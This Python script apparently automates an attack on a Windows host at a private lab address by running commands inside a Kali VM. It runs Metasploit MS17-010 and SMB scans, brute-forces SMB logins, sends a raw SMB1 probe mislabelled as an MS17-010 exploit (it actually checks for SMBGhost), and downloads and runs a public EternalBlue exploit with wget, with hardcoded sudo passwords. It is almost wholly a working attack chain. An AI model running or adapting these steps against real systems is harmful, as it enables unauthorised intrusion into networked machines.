#!/usr/bin/env python3
"""Step 6: Fix msfconsole permissions + run MS17-010 scan + direct exploit"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Fix msfconsole permissions
print("=" * 60)
print("[1] Fix Metasploit permissions")
print("=" * 60)
out = run_kali("echo kali | sudo -S chmod -R 755 /usr/lib/mysql/ 2>&1 && echo 'Fixed permissions'", timeout=30)
print(out)

# 2. Run MS17-010 scanner
print("\n" + "=" * 60)
print("[2] MS17-010 vulnerability scanner (Metasploit)")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit' 2>&1",
    timeout=180
)
print(out)

# 3. Try auxiliary scanner for SMB versions
print("\n" + "=" * 60)
print("[3] SMB version scanner")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.233.129; run; exit' 2>&1",
    timeout=120
)
print(out)

# 4. Try psexec with known username lkjm
print("\n" + "=" * 60)
print("[4] PSExec brute force via Metasploit")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x '"
    "use auxiliary/scanner/smb/smb_login; "
    "set RHOSTS 192.168.233.129; "
    "set USER_FILE /tmp/users.txt; "
    "set PASS_FILE /tmp/passes.txt; "
    "set STOP_ON_SUCCESS true; "
    "run; exit' 2>&1",
    timeout=300
)
print(out)

# 5. Try direct Python MS17-010 exploit
print("\n" + "=" * 60)
print("[5] Direct MS17-010 Python exploit")
print("=" * 60)
out = run_kali(
    "python3 -c '"
    "import socket, struct, sys;"
    "target = \"192.168.233.129\";"
    "s = socket.socket();"
    "s.settimeout(5);"
    "try:"
    "  s.connect((target, 445));"
    "  # SMB1 negotiate"
    "  s.send(bytes.fromhex(\"0000002fff534d427200000000185307000000000000000000000000000000000000000000003100024e54204c4d20302e313200020200000000000000\"));"
    "  r = s.recv(4096);"
    "  print(f\"SMB1 negotiate response: {len(r)} bytes\");"
    "  if len(r) > 32:"
    "    major = r[32]; minor = r[33];"
    "    build = struct.unpack(\"<H\", r[34:36])[0];"
    "    print(f\"OS: {major}.{minor} Build {build}\");"
    "    if 18362 <= build <= 18363:"
    "      print(\"[!] VULNERABLE to SMBGhost!\");"
    "    else:"
    "      print(f\"[*] Build {build} - not vulnerable to SMBGhost\");"
    "  s.close();"
    "except Exception as e:"
    "  print(f\"Error: {e}\");"
    "' 2>&1",
    timeout=30
)
print(out)

# 6. Try nmap NSE for EternalBlue
print("\n" + "=" * 60)
print("[6] Nmap EternalBlue (MS17-010) NSE script")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S nmap -p 445 --script smb-vuln-ms17-010 --script-args smb-vuln-ms17-010.verbose 192.168.233.129 2>&1",
    timeout=60
)
print(out)

# 7. Download eternalblue exploit
print("\n" + "=" * 60)
print("[7] Download and run eternalblue_exploit")
print("=" * 60)
out = run_kali(
    "cd /tmp && "
    "wget -q https://raw.githubusercontent.com/worawit/MS17-010/master/eternalblue_exploit7.py 2>&1 && "
    "python3 eternalblue_exploit7.py 2>&1 | head -5 || "
    "echo 'Download failed, using searchsploit' && "
    "searchsploit -m 42031 2>&1 && "
    "python3 42031.py 2>&1 | head -10",
    timeout=60
)
print(out)

print("\n" + "=" * 60)
print("EXPLOIT PHASE COMPLETE")
print("=" * 60)
